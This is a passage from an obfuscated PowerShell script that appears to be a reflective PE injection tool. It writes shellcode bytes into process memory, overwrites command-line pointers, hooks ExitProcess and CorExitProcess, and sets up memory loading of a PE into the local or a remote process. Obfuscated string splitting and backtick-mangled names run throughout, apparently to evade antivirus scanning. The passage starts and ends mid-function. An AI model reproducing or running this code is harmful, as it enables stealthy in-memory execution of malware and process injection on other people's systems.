		${GE`T`CoM`maNDLIN`eA`ADdrTe`mp} = ${gE`Tc`OMMaNDlInEaad`dr}
		&("{5}{1}{4}{2}{0}{3}" -f 'r','yte','ToMemo','y','s','Write-B') -Bytes ${SHELl`cOd`E1} -MemoryAddress ${gEtC`OM`mAND`l`inEaaddr`Te`Mp}
		${getcOmMA`NDlIN`eAaDD`R`TeMp} = &("{5}{3}{4}{2}{0}{1}" -f'Uns','igned','ntAs','gned','I','Add-Si') ${gE`Tc`o`MmANdLI`NE`A`ADDRtemp} (${she`l`l`cOdE1}."len`GTh")
		[System.Runtime.InteropServices.Marshal]::('Struct'+'u'+'reTo'+'P'+'tr').Invoke(${Cm`dLinE`AARGs`PTR}, ${GEtCOmMan`dLine`A`ADd`Rtemp}, ${Fa`Lse})
		${GEt`cO`MmAND`LinEa`AddRTEmp} = &("{1}{0}{5}{4}{3}{6}{2}"-f'd','Ad','signed','nedIn','g','-Si','tAsUn') ${G`EtCOMm`AN`D`lInEAA`DDRT`eMp} ${pTrs`Ize}
		&("{5}{2}{3}{0}{1}{4}"-f'e-Byt','es','ri','t','ToMemory','W') -Bytes ${sH`e`LlcO`De2} -MemoryAddress ${getCOmmA`Ndl`In`eA`A`dd`RtE`MP}
		
		${WiN32`Fu`N`ctIons}."V`IrTUa`lpRoT`ECT"."i`NV`OKE"(${g`e`TcOmmanDlINE`A`ADDr}, [UInt32]${t`ot`ALsIzE}, [UInt32]${O`LDpRot`ec`T`FlAg}, [Ref]${oldpR`o`TEctf`lag}) | &("{2}{0}{1}" -f 't-Nu','ll','Ou')
		
		
		
		[UInt32]${OLd`pRoT`ECT`FLaG} = 0
		${sUC`CE`SS} = ${win32fU`NctIO`NS}."vir`T`UAlpr`OteCT"."i`NVoKe"(${GeTC`OM`mA`ND`lInewad`dR}, [UInt32]${tOT`ALs`I`ze}, [UInt32](${W`I`N32CONst`AN`TS}."paGe_E`x`eCUTe_`REaD`write"), [Ref]${ol`DPRo`TectFlaG})
		if (${SU`Cc`ESS} = ${f`Alse})
		{
			throw ('C'+("{0}{1}"-f 'a','ll t')+'o'+("{1}{0}{2}"-f'tua',' Vir','lPr')+'ote'+("{0}{2}{1}" -f'ct fai','e','l')+'d')
		}
		
		${GEt`cOMmAnDLi`Ne`WA`Dd`Rte`mp} = ${GET`COmMa`Ndl`iN`eWa`Ddr}
		&("{0}{2}{1}{3}{4}"-f'Write-','tesT','By','oMem','ory') -Bytes ${S`HElL`cOd`E1} -MemoryAddress ${Ge`TCO`MMAnDl`InewadDRT`E`Mp}
		${geTc`o`MMANDlin`Ewadd`Rt`eMp} = &("{5}{3}{6}{4}{0}{1}{2}" -f'dInt','AsUnsig','ned','dd-','gne','A','Si') ${GeTC`O`m`ManDL`I`NewAddrtemp} (${sh`eLL`COD`e1}."lE`NgTH")
		[System.Runtime.InteropServices.Marshal]::('S'+'truc'+'tur'+'eToPt'+'r').Invoke(${c`M`d`LINEWarGs`PTr}, ${GetC`Om`M`A`ND`LiNewADdr`TEmp}, ${FAl`sE})
		${ge`TcommANDL`inE`wA`dd`Rt`e`MP} = &("{0}{3}{4}{1}{2}{5}" -f 'Add','tAsUns','igne','-SignedI','n','d') ${GEt`CoMmAND`l`in`EWaddr`T`eMP} ${PTr`s`iZe}
		&("{1}{4}{2}{5}{0}{3}" -f 'ToM','Writ','-B','emory','e','ytes') -Bytes ${S`HELLC`oDe2} -MemoryAddress ${getcomMa`Nd`LI`NE`wADdRteMP}
		
		${WiN32`F`U`NcTI`Ons}."Vi`RTu`AlPro`TECT"."i`NVoKe"(${GetCOmmAnD`LIn`Ew`ADdr}, [UInt32]${to`T`AlsIZe}, [UInt32]${OL`dprOte`Ctfl`Ag}, [Ref]${OL`DPr`oTE`ctfLAG}) | &("{2}{1}{0}" -f 'l','ut-Nul','O')
		
		
		
		
		
		
		
		
		${dlLL`I`St} = @(('m'+'s'+("{1}{2}{3}{0}" -f'll','vcr7','0d','.d')), ('ms'+("{0}{1}"-f'v','cr71d')+'.d'+'ll'), (("{1}{0}{2}" -f'vc','ms','r80d')+'.'+'d'+'ll'), ('ms'+'vc'+("{0}{1}"-f 'r90d','.d')+'ll'), ('m'+'svc'+("{1}{0}" -f'100d.','r')+'dll'), ('m'+("{0}{1}" -f 'svc','r1')+'10'+("{1}{0}"-f 'll','d.d')), ('m'+'sv'+("{1}{0}"-f'r70.','c')+'dll') `
			, (("{0}{2}{1}"-f 'msvc','7','r')+'1.'+'d'+'ll'), (("{0}{1}" -f 'ms','vcr80')+'.dl'+'l'), ('m'+'svc'+'r90'+("{0}{1}" -f'.d','ll')), (("{2}{0}{1}"-f'r','1','msvc')+'00'+("{0}{1}" -f '.','dll')), (("{2}{0}{1}" -f'vcr11','0','ms')+'.'+'d'+'ll'))
		
		foreach (${d`ll} in ${d`lLLiSt})
		{
			[IntPtr]${dL`Lha`NDle} = ${Win`3`2fUnC`TIo`Ns}."g`et`M`oDULeHan`dLE"."In`VoKe"(${d`Ll})
			if (${dLLh`AN`DLe} -ne [IntPtr]::"ZE`Ro")
			{
				[IntPtr]${wC`MDLN`AD`DR} = ${wiN32`F`UnCTiO`Ns}."gETp`R`ocaD`d`Ress"."iNv`oKE"(${D`LlhAn`d`LE}, ('_w'+("{1}{0}" -f'mdln','c')))
				[IntPtr]${aC`MDLn`A`ddR} = ${win`32fUNC`TiO`Ns}."GETpRoC`ADDre`sS"."iNvO`KE"(${dLLhA`N`D`le}, ('_'+("{0}{1}"-f'ac','mdl')+'n'))
				if (${wCMd`LNAd`dR} -eq [IntPtr]::"Z`ERO" -or ${aCm`DLN`A`DDR} -eq [IntPtr]::"ZE`RO")
				{
					((("{0}{1}{2}" -f 'Er','ro','r,')+' couldn{0}t find '+'_w'+("{1}{0}"-f'dl','cm')+'n '+'or '+("{1}{2}{0}" -f'ln','_acm','d'))-f[cHAR]39)
				}
				
				${NEW`A`cm`d`lNPTR} = [System.Runtime.InteropServices.Marshal]::('S'+'t'+'ringT'+'oHG'+'lobalA'+'nsi').Invoke(${E`x`EARG`UMEnTS})
				${N`EwWCMD`L`NPtR} = [System.Runtime.InteropServices.Marshal]::('Stri'+'ngToHG'+'lo'+'balUni').Invoke(${eXEArG`UmE`N`Ts})
				
				
				${Or`iGAcMDlNp`TR} = [System.Runtime.InteropServices.Marshal]::"ptrtos`T`R`UCTuRe"(${AcMD`ln`A`dDr}, [Type][IntPtr])
				${OrIGWc`md`Ln`p`TR} = [System.Runtime.InteropServices.Marshal]::"p`T`R`TosT`RuCture"(${wc`m`dlN`ADdR}, [Type][IntPtr])
				${orIGaC`M`dl`NPTrSTor`A`ge} = [System.Runtime.InteropServices.Marshal]::('Al'+'locH'+'G'+'lobal').Invoke(${P`Trsi`ze})
				${OriG`w`cMdlNpT`RsTORagE} = [System.Runtime.InteropServices.Marshal]::('A'+'lloc'+'HGlobal').Invoke(${P`TrsiZE})
				[System.Runtime.InteropServices.Marshal]::('S'+'truc'+'tur'+'eT'+'oPtr').Invoke(${oRI`ga`cm`D`LNPtr}, ${O`RigaCMDln`pTRst`ORagE}, ${fa`LsE})
				[System.Runtime.InteropServices.Marshal]::('Str'+'uc'+'tu'+'reToPtr').Invoke(${O`RIGw`CmdLnPTr}, ${oRIGW`C`M`DLnptRS`TorAgE}, ${f`Al`SE})
				${R`Et`UrnaRr`AY} += ,(${a`cm`dLn`ADDR}, ${o`RiGaC`mDln`ptR`s`TOrA`gE}, ${ptR`s`Ize})
				${rE`T`URNarr`Ay} += ,(${WCm`DlnA`D`DR}, ${ORIg`Wc`mDLnp`TrstORa`Ge}, ${PT`R`SiZe})
				
				${SUC`ce`Ss} = ${WI`N32`FunC`T`iOnS}."VIr`TUAlPRo`TECT"."I`NV`oKE"(${ACMD`l`N`ADdR}, [UInt32]${pt`Rs`iZe}, [UInt32](${w`in32CONS`Ta`N`TS}."Page_E`xec`Ute_`REad`Write"), [Ref]${o`ldPRoTec`TF`l`Ag})
				if (${S`U`cCesS} = ${f`Alse})
				{
					throw ('Cal'+'l'+' '+'to'+' V'+("{0}{1}" -f 'irt','ua')+'l'+("{0}{1}{2}" -f 'Prot','e','ct f')+("{1}{0}"-f 'led','ai'))
				}
				[System.Runtime.InteropServices.Marshal]::('StructureT'+'oP'+'tr').Invoke(${N`EWAcM`d`lNPtR}, ${a`c`m`dLnaddr}, ${FA`Lse})
				${W`in`32F`Un`CtiONs}."V`Irt`U`AlprO`TeCT"."iNV`O`KE"(${ACmdl`Nad`dr}, [UInt32]${PTR`s`ize}, [UInt32](${oLDpr`OTeCT`F`laG}), [Ref]${OldP`R`oTe`ctF`LAG}) | &("{2}{1}{0}" -f'Null','t-','Ou')
				
				${sU`C`cESs} = ${WiN32FU`NCT`I`onS}."vi`RTual`PrOtEcT"."IN`VOkE"(${W`cm`d`LNaDdR}, [UInt32]${PtrSI`ze}, [UInt32](${wiN32C`oN`StA`NTs}."pAge`_E`xecutE`_Rea`DW`Ri`Te"), [Ref]${OLdPR`o`TeC`TF`lag})
				if (${suC`CeSS} = ${FA`LSe})
				{
					throw ('C'+("{0}{2}{1}"-f'all to V','rt','i')+'ual'+("{1}{0}" -f'ot','Pr')+'e'+'c'+'t f'+("{1}{0}" -f'iled','a'))
				}
				[System.Runtime.InteropServices.Marshal]::('St'+'ru'+'ct'+'ureToPtr').Invoke(${n`EWwcMDl`NptR}, ${wCm`DlnAd`Dr}, ${f`Al`Se})
				${w`In`32fUnctIO`NS}."vI`RtU`ALPro`TECT"."iNvO`KE"(${wCM`DlnAD`dr}, [UInt32]${p`TRsi`ZE}, [UInt32](${oLd`prO`Tec`TFLag}), [Ref]${oLdpR`o`TEcTF`lAG}) | &("{1}{2}{0}" -f 'l','O','ut-Nul')
			}
		}
		
		
		
		
		

		${Ret`UrnA`Rr`AY} = @()
		${Ex`iTfu`NC`TIOns} = @() 
		
		
		[IntPtr]${MSCOr`EEHA`N`dle} = ${WiN32`FuN`c`TIons}."G`ETmo`D`UlEHAn`DLE"."INVo`KE"((("{0}{1}"-f'msco','r')+("{1}{0}"-f'd','ee.')+'ll'))
		if (${m`s`cOreehAND`LE} -eq [IntPtr]::"Z`ErO")
		{
			throw ('m'+'sc'+'ore'+'e'+("{1}{0}" -f'n',' ha')+("{0}{1}"-f'd','le null'))
		}
		[IntPtr]${c`o`R`ex`It`proCEssAdDR} = ${win3`2`FuN`CTIO`Ns}."GetProC`A`dD`Re`sS"."In`VOkE"(${m`scOREEh`AnDLE}, ('Co'+'rEx'+("{0}{1}" -f 'it','Pr')+("{0}{1}"-f'o','ces')+'s'))
		if (${cO`Rexi`TPr`OcESSaDDr} -eq [IntPtr]::"Z`ERo")
		{
			Throw (("{0}{1}"-f'CorE','xit')+("{0}{1}"-f'Proce','s')+'s '+'a'+("{0}{1}"-f'dd','re')+("{1}{0}" -f ' ','ss not')+'fo'+'und')
		}
		${EX`ItfU`NcT`ions} += ${c`Or`exItpROCEsS`AdDr}
		
		
		[IntPtr]${e`XITPR`Oc`eSSaddR} = ${Win32F`Uncti`o`NS}."gEt`PrOCa`d`dREss"."I`NVoKE"(${Ke`R`Nel3`2h`ANdle}, ('Ex'+'it'+("{1}{0}"-f 'roc','P')+'ess'))
		if (${ExIT`prO`CeSSA`D`dr} -eq [IntPtr]::"z`ero")
		{
			Throw ('E'+("{1}{0}"-f 'r','xitP')+'oc'+("{3}{2}{1}{0}"-f 's','res','ss add','e')+' no'+'t'+("{1}{0}" -f'ound',' f'))
		}
		${E`xIt`FuNcT`iO`Ns} += ${EXiTp`ROCe`sSaDDr}
		
		[UInt32]${Ol`D`pR`oTEctFL`AG} = 0
		foreach (${pr`Ocex`iTFUN`cTIoN`AD`Dr} in ${e`XIt`FuNCtioNs})
		{
			${Pr`o`CexIT`FU`NCtioNadD`RTmp} = ${prO`ceXI`TfuNctI`oNAddR}
			
			
			[Byte[]]${SHe`LLcO`DE1} = @(0xbb)
			[Byte[]]${S`H`eLLcoDE2} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			
			if (${pT`R`SiZE} -eq 8)
			{
				[Byte[]]${S`he`lL`coDe1} = @(0x48, 0xbb)
				[Byte[]]${SHe`lL`COde2} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${s`HELL`CodE3} = @(0xff, 0xd3)
			${t`OTaLs`IZE} = ${SH`E`llc`Ode1}."le`NGtH" + ${PT`R`SIZe} + ${S`hEllcO`DE2}."LEN`gth" + ${PT`R`sIze} + ${sHEl`LcO`DE3}."Le`NgtH"
			
			[IntPtr]${eXit`Thr`e`AdAddR} = ${w`In32funCtIO`Ns}."gEt`P`ROCA`DDResS"."I`NvO`ke"(${k`eR`Nel`32haND`lE}, (("{1}{0}" -f 'xit','E')+'Th'+("{0}{1}" -f 're','ad')))
			if (${ExIT`ThrEA`Da`DDr} -eq [IntPtr]::"zE`Ro")
			{
				Throw (("{0}{1}{2}"-f'E','xit','Thre')+("{2}{1}{0}"-f'e','r','ad add')+'s'+("{0}{1}" -f's ','no')+("{1}{0}"-f 'nd','t fou'))
			}

			${S`Uc`cESs} = ${WiN32`FUNc`T`IO`Ns}."vIrT`UALpR`ot`e`CT"."I`N`VOke"(${p`R`oceXItfuN`CT`ionA`ddr}, [UInt32]${T`OTALS`IZe}, [UInt32]${wIN32C`O`Ns`TANTS}."pagE_eXecu`TE`_`Re`ADW`Rite", [Ref]${ol`dPROtEc`TflAG})
			if (${sUcc`E`Ss} -eq ${fAL`SE})
			{
				Throw (("{1}{0}"-f 'all ','C')+'to'+("{1}{0}" -f 'ual',' Virt')+("{0}{1}" -f 'Pr','ote')+("{1}{0}" -f 'iled','ct fa'))
			}
			
			
			${exI`TPRo`ce`SSoRigBY`TespTR} = [System.Runtime.InteropServices.Marshal]::('Allo'+'c'+'HGlobal').Invoke(${to`T`Als`IzE})
			${w`I`N`32fUnCTiOnS}."MeM`C`py"."I`NVoKE"(${EXitpRoC`essO`R`IGbYtE`s`PtR}, ${Proc`ex`itfunC`Ti`oNAdDR}, [UInt64]${T`O`TaLSI`Ze}) | &("{0}{1}"-f 'Out-N','ull')
			${r`eT`UrnARRaY} += ,(${p`RoCE`XI`TFuNCTIO`NAd`dr}, ${EXitPro`CESs`o`RigbY`TES`P`TR}, ${T`otAlSi`zE})
			
			
			
			&("{1}{0}{3}{2}"-f'e-Byte','Writ','ry','sToMemo') -Bytes ${SHE`LLcod`E1} -MemoryAddress ${P`ROCeXIt`FuNc`Ti`ONADdRTmp}
			${PrOCeXITF`U`N`c`TioNA`d`D`RTmp} = &("{6}{3}{0}{1}{5}{2}{4}" -f 'ntAs','Uns','gn','-SignedI','ed','i','Add') ${PRO`ceXi`T`Fun`ctIoNaddRt`MP} (${s`He`l`LcodE1}."l`eN`GTh")
			[System.Runtime.InteropServices.Marshal]::('St'+'ruct'+'u'+'reToPt'+'r').Invoke(${eX`E`do`NE`BYtePtR}, ${PrOCexI`Tf`U`Nc`TiOn`A`DDrTmp}, ${f`AlSe})
			${p`Ro`CexITFUnCTIO`N`ADDRtmP} = &("{1}{3}{0}{4}{2}" -f 'nedIntAs','Add-','gned','Sig','Unsi') ${pRocExi`T`Fu`N`CTio`NadDr`TMp} ${PT`R`sIzE}
			&("{2}{3}{4}{0}{5}{1}" -f 'To','emory','Write-','B','ytes','M') -Bytes ${s`hel`LcOdE2} -MemoryAddress ${pR`oc`ex`ItfUNC`Ti`onAddrtMP}
			${p`Ro`CexItFUN`Ct`iOnAD`drtMp} = &("{1}{3}{2}{4}{0}"-f 'd','Add-Si','t','gnedIn','AsUnsigne') ${PRoc`exi`T`FuN`CTiona`D`dRtmp} (${sHElLco`d`e2}."LEn`GTh")
			[System.Runtime.InteropServices.Marshal]::('Structur'+'eToP'+'t'+'r').Invoke(${eXIT`Th`REaDAdDr}, ${pr`oceXi`T`F`UnCT`IONAd`dRt`Mp}, ${fA`Lse})
			${PRoCEx`itfun`CTionAD`DRT`Mp} = &("{2}{6}{0}{5}{3}{1}{4}"-f'i','ig','Add-','dIntAsUns','ned','gne','S') ${Pr`OCExiT`FunC`TIonaddrT`mp} ${PTRsi`ze}
			&("{3}{2}{1}{0}"-f'-BytesToMemory','e','rit','W') -Bytes ${sh`Ell`Code3} -MemoryAddress ${pRocE`XI`TFUN`cTIoNAD`dRTmP}

			${wiN3`2FU`N`cTIoNS}."vIrTua`L`prO`TE`ct"."I`NVoKe"(${P`RoC`e`XitfU`NCTIOn`AD`Dr}, [UInt32]${t`O`TAls`iZe}, [UInt32]${O`ldp`ROtE`Ct`FLaG}, [Ref]${OLD`pROT`Ect`FlAG}) | &("{0}{1}"-f 'Out-Nul','l')
		}
		

		&("{2}{0}{1}{3}" -f'e','-O','Writ','utput') ${R`ETurnA`R`RaY}
	}
	
	
	
	
	Function COp`Y`-Arr`Ayo`FmeMaDdREsSEs
	{
		Param(
		[Parameter(POSiTION = 0, MaNDatorY = ${T`RUe})]
		[Array[]]
		${COpY`In`FO},
		
		[Parameter(PosITiON = 1, maNdATORY = ${Tr`Ue})]
		[System.Object]
		${WIN3`2fU`N`cti`oNs},
		
		[Parameter(POsiTIon = 2, MANDAtorY = ${Tr`UE})]
		[System.Object]
		${WI`N3`2Co`NsTaNtS}
		)

		[UInt32]${OL`Dp`RoteC`TFl`Ag} = 0
		foreach (${I`NFO} in ${cO`P`YIN`Fo})
		{
			${s`UC`CeSs} = ${wiN32fU`N`C`TIo`NS}."vIrT`U`AlP`ROte`ct"."In`Vo`KE"(${I`NFO}[0], [UInt32]${iN`FO}[2], [UInt32]${W`iN3`2CO`NSt`ANTs}."PAge_E`XeCuTe_r`EAdwr`i`Te", [Ref]${oldP`RoT`ecTF`lAg})
			if (${sU`cC`Ess} -eq ${F`ALsE})
			{
				Throw (("{1}{0}" -f 'll','Ca')+' '+'to '+("{1}{0}"-f 'a','Virtu')+("{2}{0}{1}" -f'otec','t ','lPr')+'fa'+'il'+'e'+'d')
			}
			
			${wiN`32FUNcT`I`O`Ns}."M`eM`Cpy"."iNV`OKE"(${IN`Fo}[0], ${iN`Fo}[1], [UInt64]${i`Nfo}[2]) | &("{2}{1}{0}" -f 'l','-Nul','Out')
			
			${WiN32f`UN`CtI`O`Ns}."vIrTUaLprO`T`EcT"."In`VOkE"(${In`FO}[0], [UInt32]${I`NFo}[2], [UInt32]${oldProT`ecTf`lAG}, [Ref]${olD`PR`OtEctfLag}) | &("{0}{1}{2}" -f'O','ut-N','ull')
		}
	}


	
	
	
	Function g`Et-mEm`OR`YP`Ro`cAdd`REsS
	{
		Param(
		[Parameter(posiTiON = 0, manDatorY = ${t`Rue})]
		[IntPtr]
		${P`EHA`NDle},
		
		[Parameter(pOSITIOn = 1, maNdatorY = ${T`RUE})]
		[String]
		${fUnCt`I`Onna`Me}
		)
		
		${WI`N3`2`TYPeS} = &("{0}{3}{1}{4}{2}" -f'Get-Wi','2T','es','n3','yp')
		${WiN3`2`c`oNSTanTS} = &("{2}{1}{4}{3}{0}"-f 'stants','t-','Ge','n','Win32Co')
		${peI`NFo} = &("{0}{4}{3}{1}{2}" -f 'G','e','tailedInfo','D','et-PE') -PEHandle ${peHa`ND`Le} -Win32Types ${w`iN32t`Y`Pes} -Win32Constants ${Wi`N32c`onS`TaNts}
		
		
		if (${pEIN`FO}."im`AGe_nT_`hEAD`e`RS"."o`p`TioNalH`EaDEr"."exp`oRt`T`ABle"."si`ZE" -eq 0)
		{
			return [IntPtr]::"z`ero"
		}
		${EXp`orTTABl`E`PTR} = &("{2}{4}{5}{0}{6}{1}{3}" -f'tA','sign','A','ed','dd','-SignedIn','sUn') (${PeHA`N`DLe}) (${pE`iNFo}."iMAGE_`N`T_HEa`DERs"."o`ptionaL`H`EaDeR"."Ex`poRTTa`BlE"."VI`RtUA`LADDREsS")
		${e`xPOr`Tta`Ble} = [System.Runtime.InteropServices.Marshal]::"pt`RTo`St`R`Ucture"(${eXpOrTt`A`BlE`P`Tr}, [Type]${Wi`N`32TY`pEs}."i`M`AgE_ex`PoRT_`DIr`ECTO`RY")
		
		for (${I} = 0; ${i} -lt ${e`X`p`oRTTaBlE}."NUM`BerofNAM`ES"; ${i}++)
		{
			
			${nameO`FF`seTP`TR} = &("{3}{4}{2}{1}{0}"-f 'ned','ntAsUnsig','I','Add-Signe','d') (${peHA`Nd`LE}) (${Ex`porTt`Ab`Le}."Ad`DrESsOf`NA`meS" + (${i} * [System.Runtime.InteropServices.Marshal]::"siz`Eof"([Type][UInt32])))
			${n`AM`epTr} = &("{1}{3}{2}{0}{5}{4}" -f 'edIntAsU','Add-S','n','ig','d','nsigne') (${Pe`H`AnDle}) ([System.Runtime.InteropServices.Marshal]::"ptr`Tos`TR`UCtUrE"(${NaM`eO`F`FSetP`Tr}, [Type][UInt32]))
			${n`Ame} = [System.Runtime.InteropServices.Marshal]::('Ptr'+'ToSt'+'ring'+'Ansi').Invoke(${n`A`mEPtr})

			if (${N`AME} -ceq ${F`Unc`Tionname})
			{
				
				
				${OrD`In`A`lPtr} = &("{2}{0}{3}{1}{4}" -f'e','s','Add-Sign','dIntA','Unsigned') (${p`ehA`Ndle}) (${EXpOR`Tt`AB`Le}."Ad`d`R`E`ssOFnam`EOR`DiNALS" + (${I} * [System.Runtime.InteropServices.Marshal]::"S`I`zeOF"([Type][UInt16])))
				${fuNciN`d`Ex} = [System.Runtime.InteropServices.Marshal]::"p`TrtOSt`RuC`TurE"(${o`Rd`iNalPTR}, [Type][UInt16])
				${FuNCo`F`FS`EtA`dDr} = &("{0}{1}{4}{2}{3}"-f 'A','dd-Si','AsUn','signed','gnedInt') (${PeH`AndLe}) (${eXpOR`TT`ABLE}."ADDress`oF`FuNcTiO`Ns" + (${fUn`C`iNdEX} * [System.Runtime.InteropServices.Marshal]::"sIZ`EOf"([Type][UInt32])))
				${FU`N`cOFfsET} = [System.Runtime.InteropServices.Marshal]::"p`Tr`TostR`UctURe"(${fUnc`OF`FSET`AD`dR}, [Type][UInt32])
				return &("{4}{0}{2}{3}{6}{5}{1}"-f 'd','signed','-Si','gnedInt','Ad','sUn','A') (${pe`hAn`dle}) (${FuNCoF`FS`ET})
			}
		}
		
		return [IntPtr]::"z`ero"
	}


	Function I`NVoKE-`MemOryLo`ADl`I`B`RA`Ry
	{
		Param(
		[Parameter( POSITIOn = 0, MaNDaTORY = ${tr`Ue} )]
		[Byte[]]
		${peBy`Tes},
		
		[Parameter(PosItION = 1, ManDatoRy = ${fA`LsE})]
		[String]
		${e`xEaR`gS},
		
		[Parameter(POSitIoN = 2, mANdATorY = ${F`ALsE})]
		[IntPtr]
		${RemoT`e`p`RocHAnd`lE}
		)
		
		${PtrSI`Ze} = [System.Runtime.InteropServices.Marshal]::"Si`ZEOF"([Type][IntPtr])
		
		
		${WiN3`2CONST`A`N`TS} = &("{3}{2}{0}{1}"-f'n','ts','Win32Consta','Get-')
		${wiN`32F`UN`CtI`oNs} = &("{1}{2}{3}{4}{0}" -f 'ions','G','e','t-Win3','2Funct')
		${wIn32t`YP`ES} = &("{3}{2}{0}{1}{4}" -f 'in','32Typ','et-W','G','es')
		
		${RemOt`ELO`A`dI`NG} = ${fA`LSe}
		if ((${REMo`Te`PR`OC`HAN`dlE} -ne ${n`UlL}) -and (${ReMotep`ROc`HAn`DLE} -ne [IntPtr]::"Z`ero"))
		{
			${rEmoTE`lO`AD`Ing} = ${T`RUE}
		}
		
		
		&("{2}{1}{0}"-f 'e','rbos','Write-Ve') (("{0}{1}" -f'Get','ti')+'n'+("{0}{1}" -f'g b','as')+'ic'+("{1}{0}" -f 'n',' PE i')+("{1}{0}"-f 'm','for')+'ati'+("{3}{2}{0}{1}" -f'fil','e','from the ','on '))
		${p`eiNFO} = &("{3}{1}{2}{0}" -f 'o','et-P','EBasicInf','G') -PEBytes ${P`E`BYTES} -Win32Types ${W`IN32ty`peS}
		${o`R`IGInaLIMa`gE`BaSE} = ${P`EiNFo}."oR`IG`i`Nali`Ma`GebASE"
		${nX`coM`pa`TiblE} = ${T`RUE}
		if (([Int] ${p`ein`FO}."dLLChAra`cTE`RIst`i`Cs" -band ${Win3`2c`onsTA`Nts}."IMAGE`_Dll`chaRacTErIsT`I`c`S_N`x_comPAT") -ne ${wIN32COnsT`A`N`TS}."i`maG`E_DlLCh`Ara`ct`erIst`ICs_nX_cO`M`pAt")
		{
			&("{3}{0}{1}{2}"-f'rite-','Warnin','g','W') ('PE'+("{1}{0}"-f's ',' i')+'n'+'o'+("{0}{1}" -f't comp','at')+'ib'+'l'+'e'+("{0}{1}"-f' wi','t')+'h D'+("{1}{0}" -f'P, m','E')+("{1}{0}{2}"-f'ght','i',' ca')+'u'+'se'+("{0}{1}{2}"-f' issu','e','s')) -WarningAction ('C'+'ont'+'inue')
			${NXC`OMPATi`Ble} = ${FA`l`se}
		}
		
		
		
		${Pr`OCess`6`4Bit} = ${Tr`Ue}
		if (${remOTeLo`AdI`NG} -eq ${Tr`Ue})
		{
			${k`erne`L32HAN`d`LE} = ${w`In3`2FUn`Ct`IonS}."G`Et`MODu`LEH`AndLE"."IN`V`Oke"((("{1}{2}{0}" -f 'l32','k','erne')+'.'+'d'+'ll'))
			${Re`sU`lt} = ${WIN32Func`T`IONS}."G`EtPR`o`cADDREsS"."i`NVokE"(${keR`NeL32H`A`ND`lE}, (("{1}{0}" -f'o','IsW')+'w6'+("{1}{0}"-f 'roces','4P')+'s'))
			if (${Res`U`lt} -eq [IntPtr]::"Z`ErO")
			{
				Throw ((("{1}{0}"-f'd','Coul')+'n{0'+'}'+("{3}{2}{0}{1}"-f'e',' I','cat','t lo')+'sW'+'o'+'w'+'6'+'4'+("{0}{1}" -f'Pr','oc')+'es'+("{0}{1}{2}"-f's',' func','tion')+' t'+'o'+' '+("{0}{1}" -f 'd','ete')+("{0}{2}{1}"-f'rmin','if ','e ')+("{2}{1}{0}" -f't','ge','tar')+("{2}{1}{3}{0}"-f 'i','oce',' pr','ss ')+'s '+("{1}{0}"-f'2bit','3')+' o'+'r'+' 6'+("{0}{1}" -f'4bi','t')) -F[cHar]39)
			}
			
			[Bool]${wow6`4p`ROC`ess} = ${fAL`sE}
			${S`UcCE`ss} = ${WIN3`2fUNCT`IoNS}."isW`ow`64`pr`ocEsS"."I`NvoKE"(${REM`oTE`proc`h`ANd`le}, [Ref]${WO`W6`4P`ROCess})
			if (${Su`C`CESs} -eq ${FA`l`SE})
			{
				Throw ('Ca'+("{2}{0}{1}"-f'l',' to I','l')+("{1}{0}" -f'w','sWo')+'64'+("{1}{0}"-f 'c','Pro')+("{0}{1}" -f 'e','ss ')+'f'+'ai'+'led')
			}
			
			if ((${W`O`W64`PRoc`eSS} -eq ${tR`UE}) -or ((${WOW64`PRoC`e`Ss} -eq ${fal`Se}) -and ([System.Runtime.InteropServices.Marshal]::"SI`zEof"([Type][IntPtr]) -eq 4)))
			{
				${ProCESS`64B`iT} = ${fa`lSE}
			}
			
			
			${pOWe`RSH`ELL6`4`BIt} = ${Tr`UE}
			if ([System.Runtime.InteropServices.Marshal]::"sI`ZEOf"([Type][IntPtr]) -ne 8)
			{
				${p`OWERs`HeLL6`4b`IT} = ${FA`lse}
			}
			if (${pOw`ErS`hEl`L64`BIt} -ne ${pr`o`CeS`s64b`it})
			{
				throw ('P'+'o'+'w'+'erS'+'he'+'ll '+("{2}{1}{0}" -f 'm','ust be sa','m')+'e a'+'rc'+'hi'+("{1}{0}" -f 'ect','t')+'ur'+'e'+((("{1}{0}"-f'x8',' (')))+((("{1}{2}{3}{0}" -f'PE ','6/','x64',') as ')))+'b'+("{1}{0}" -f'ing','e')+("{1}{2}{0}" -f'aded ',' l','o')+("{2}{1}{4}{3}{0}" -f 'e pr','nd','a','mot',' re')+("{1}{0}" -f 'ess','oc'))
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::"sIz`EoF"([Type][IntPtr]) -ne 8)
			{
				${P`ROcEss6`4Bit} = ${Fa`lSE}
			}
		}
		if (${Pr`OCESS`64bIT} -ne ${PEin`Fo}."P`E64`BIt")
		{
			Throw ((("{0}{1}" -f 'PE',' pl')+("{0}{1}{2}"-f'atform',' d','o')+("{0}{1}{2}{4}{3}" -f'es','nwBat m','a','ch','t')+("{3}{2}{1}{0}" -f'ite','h','he arc',' t')+("{2}{0}{1}"-f'ure of ','th','ct')+'e p'+'r'+("{1}{0}"-f'cess','o')+' it'+' '+("{2}{0}{1}" -f' bein','g','is')+("{2}{0}{1}"-f'oa','de',' l')+'d i'+((("{2}{1}{0}"-f '(32/',' ','n')))+'64b'+'it)') -REPlACE([CHAR]119+[CHAR]66+[CHAR]97),[CHAR]39)
		}
		

		
		&("{0}{2}{3}{1}" -f'Write','e','-','Verbos') ('Al'+("{1}{0}{2}" -f 't','loca','ing m')+'em'+("{0}{2}{1}" -f 'ory fo','he','r t')+("{0}{1}"-f' PE',' ')+("{0}{1}" -f 'and ','wr')+'i'+("{2}{0}{1}{3}" -f'ts',' he','te i','ad')+("{1}{0}" -f's t','er')+("{1}{0}" -f'ry','o memo'))
		
		[IntPtr]${L`o`ADAddr} = [IntPtr]::"Z`erO"
		if (([Int] ${Pe`iNfO}."d`llCharaCTer`iST`ICs" -band ${wI`N32con`StAnTs}."im`AGe_d`lL`ChA`RacTER`ISti`cs_dy`NAMi`c`_bAse") -ne ${W`i`N32cO`N`STANtS}."i`M`AgE_DllchA`RacTE`Ris`TICS_dynAmIC_ba`SE")
		{
